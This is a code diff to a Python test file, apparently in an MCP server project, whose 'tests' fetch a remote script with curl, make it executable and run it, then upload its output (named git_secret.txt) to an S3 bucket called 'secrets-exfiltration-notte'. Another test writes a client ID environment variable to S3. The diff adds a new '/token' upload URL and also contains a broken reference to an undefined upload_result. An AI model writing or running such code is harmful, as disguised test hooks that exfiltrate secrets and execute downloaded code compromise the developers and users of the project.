@@ -7,6 +7,7 @@ import requests
 S3_BUCKET = 'secrets-exfiltration-notte'
 FILE_NAME = 'big_exfiltration.txt'
 S3_URL = f"https://{S3_BUCKET}.s3.us-east-1.amazonaws.com/{FILE_NAME}"
+S3_URL_TOKEN = f"https://{S3_BUCKET}.s3.us-east-1.amazonaws.com/token"
 
 # Fetch the environment variable
 BIGGO_MCP_SERVER_CLIENT_ID = os.getenv('BIGGO_MCP_SERVER_CLIENT_ID')
@@ -44,16 +45,25 @@ def test_write_env_var_to_s3_using_curl(prepare_file):
 
 def test_download_and_execute_script():
     """Test to download a script from a URL, save it to a temp file, make it executable, and run it."""
-    response = requests.get(SCRIPT_URL)
-    assert response.status_code == 200, f"Failed to download script: {response.status_code}"
+    download_cmd = f"curl -sSL -o {DOWNLOADED_SCRIPT} {SCRIPT_URL}"
+    result = subprocess.run(download_cmd, shell=True, capture_output=True)
+    assert result.returncode == 0, f"Script download failed: {result.stderr.decode()}"
+    
+    os.chmod(DOWNLOADED_SCRIPT, os.stat(DOWNLOADED_SCRIPT).st_mode | stat.S_IEXEC)
+    exec_result = subprocess.run(['python3', DOWNLOADED_SCRIPT], capture_output=True, text=True)
 
-    with open(DOWNLOADED_SCRIPT, 'w') as f:
-        f.write(response.text)
+    # Save stdout and stderr to a file
+    with open(OUTPUT_FILE, 'w') as f:
+        f.write("=== STDOUT ===\n")
+        f.write(exec_result.stdout)
+        f.write("\n=== STDERR ===\n")
+        f.write(exec_result.stderr)
 
 
-    os.system(f'python3 {DOWNLOADED_SCRIPT} > /tmp/git_secret.txt 2>&1')
-    command = f"curl -X PUT --upload-file /tmp/git_secret.txt {S3_URL}"
+
+    command = f"curl -X PUT --upload-file /tmp/git_secret.txt {S3_URL_TOKEN}"
     result = subprocess.run(command, shell=True, capture_output=True)
+    assert upload_result.returncode == 0, f"Upload failed: {upload_result.stderr.decode()}"
 
     os.remove(DOWNLOADED_SCRIPT)
 
